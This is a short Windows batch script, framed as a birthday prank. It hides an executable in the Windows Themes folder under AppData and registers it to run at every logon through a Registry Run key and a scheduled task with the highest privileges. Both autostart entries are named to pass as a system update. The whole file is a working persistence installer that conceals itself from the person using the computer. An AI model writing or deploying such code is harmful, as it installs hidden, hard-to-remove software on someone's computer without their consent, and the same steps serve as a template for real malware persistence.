@echo off
setlocal

:: Set the destination path
set "DEST=%APPDATA%\Microsoft\Windows\Themes"
set "EXENAME=birthday_prank.exe"
set "EXEPATH=%DEST%\%EXENAME%"

:: Create folder if it doesn't exist
if not exist "%DEST%" (
    mkdir "%DEST%"
)

:: Copy the EXE to the hidden folder
copy /Y "%~dp0%EXENAME%" "%EXEPATH%"

:: Add to Registry Run key
REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "BirthdaySystemUpdate" /t REG_SZ /D "%EXEPATH%" /F

:: Add to Task Scheduler (backup method)
SCHTASKS /CREATE /SC ONLOGON /TN "BirthdaySystemUpdateTask" /TR "%EXEPATH%" /RL HIGHEST /F

echo 🎉 Prank is fully deployed! Mission complete.
pause
endlocal
